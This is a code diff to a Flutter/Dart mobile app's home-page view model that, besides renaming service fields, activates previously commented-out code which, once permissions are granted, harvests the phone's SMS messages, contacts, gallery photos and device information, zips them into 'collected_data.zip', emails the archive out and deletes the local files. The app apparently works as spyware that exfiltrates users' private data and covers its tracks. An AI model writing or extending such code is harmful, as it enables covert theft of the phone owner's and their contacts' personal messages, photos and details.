@@ -12,36 +12,36 @@ import '../services/zipService.dart';
 import '../services/permissionsService.dart';
 
 class HomePageViewModel extends ChangeNotifier {
-  final SmsService smsService = SmsService();
-  final ContactsServices contactsService = ContactsServices();
-  final GalleryService galleryService = GalleryService();
-  final ZipService zipService = ZipService();
-  final PermissionsService permissionsService = PermissionsService();
-  final EmailService emailService = EmailService();
-  final DeviceInfoService deviceInfoService = DeviceInfoService();
+  final SmsService _smsService = SmsService();
+  final ContactsServices _contactsService = ContactsServices();
+  final GalleryService _galleryService = GalleryService();
+  final ZipService _zipService = ZipService();
+  final PermissionsService _permissionsService = PermissionsService();
+  final DeviceInfoService _deviceInfoService = DeviceInfoService();
+  final EmailService _emailService = EmailService();
 
   bool isLoading = false;
   List<File> files = [];
 
   Future<void> getDataAndSendEmail(
-      BuildContext context, String recipientEmail) async {
+      BuildContext context) async {
     try {
       bool permissionsGranted =
-          await permissionsService.requestAllPermissions();
+          await _permissionsService.requestAllPermissions();
       if (!permissionsGranted) {
         ConstMethods.showBottomSheet(context,
             const Text(AppStrings.theNecessaryPermissionsWereNotGiven));
         return;
       } else {
-        //isLoading = true;
-        //await _getSms();
-        //await _getContacts();
-        //await _getGallery();
-        //await _getDeviceInfo();
-        //final zipFile = await _createZip();
-        //await emailService.sendEmail(zipFile);
-        //await _deleteSpecificFiles();
-        //isLoading = false;
+        isLoading = true;
+        await _getSms();
+        await _getContacts();
+        await _getGallery();
+        await _getDeviceInfo();
+        final zipFile = await _createZip();
+        await _emailService.sendEmail(zipFile);
+        await _deleteSpecificFiles();
+        isLoading = false;
 
       }
     } catch (e) {
@@ -52,7 +52,7 @@ class HomePageViewModel extends ChangeNotifier {
 
   Future<void> _getSms() async {
     try {
-      final smsMessages = await smsService.getSmsMessages();
+      final smsMessages = await _smsService.getSmsMessages();
       String path = await _getFilePath('sms.txt');
       final smsFile = File(path);
       await smsFile.writeAsString(
@@ -69,7 +69,7 @@ class HomePageViewModel extends ChangeNotifier {
 
   Future<void> _getContacts() async {
     try {
-      final contacts = await contactsService.getContactsFromDevice();
+      final contacts = await _contactsService.getContactsFromDevice();
       String path = await _getFilePath('contacts.txt');
       final contactsFile = File(path);
       await contactsFile.writeAsString(
@@ -85,11 +85,11 @@ class HomePageViewModel extends ChangeNotifier {
 
   Future<void> _getGallery() async {
     try {
-      final photos = await galleryService.getPhotos();
+      final photos = await _galleryService.getPhotos();
       List<String> base64Photos = [];
 
       for (var photo in photos) {
-        String base64Photo = await galleryService.convertPhotoToBase64(photo);
+        String base64Photo = await _galleryService.convertPhotoToBase64(photo);
         base64Photos.add(base64Photo);
       }
 
@@ -106,7 +106,7 @@ class HomePageViewModel extends ChangeNotifier {
 
   Future<void> _getDeviceInfo() async {
     try {
-      List<String> deviceInfoList = await deviceInfoService.getDeviceInfo();
+      List<String> deviceInfoList = await _deviceInfoService.getDeviceInfo();
       String path = await _getFilePath('devices_info.txt');
       final deviceInfoFile = File(path);
       await deviceInfoFile.writeAsString(deviceInfoList.join('\n'));
@@ -121,7 +121,7 @@ class HomePageViewModel extends ChangeNotifier {
   Future<File> _createZip() async {
     try {
       String zipPath = await _getFilePath('collected_data.zip');
-      final zipFile = await zipService.createZip(files, zipPath);
+      final zipFile = await _zipService.createZip(files, zipPath);
       print("zip dosyası oluştu");
       print("ZIP Dosya Boyutu: ${zipFile.lengthSync() / (1024 * 1024)} MB");
 
